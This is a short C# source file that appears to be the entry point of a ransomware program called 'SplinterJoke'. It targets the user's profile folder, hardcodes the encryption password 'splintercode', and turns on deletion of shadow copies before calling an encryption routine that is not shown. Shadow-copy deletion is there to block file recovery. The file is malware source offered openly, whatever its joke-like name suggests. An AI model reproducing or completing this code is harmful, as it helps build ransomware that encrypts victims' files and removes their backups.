using System;

public static class SplinterJokeMainClass
{
	private static string startingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

	private static string encryptionPassword = "splintercode";

	private static bool deleteShadowCopies = true;

	private static bool debug = false;

	public static string SplinterJokeMain(string[] args)
	{
		string text = "";
		Console.WriteLine("SplinterJoke Running...");
		Console.WriteLine("Encrypting starting from " + startingDirectory);
		return SplinterJoke.RunSplinterJoke(startingDirectory, encryptionPassword, deleteShadowCopies, debug);
	}
}
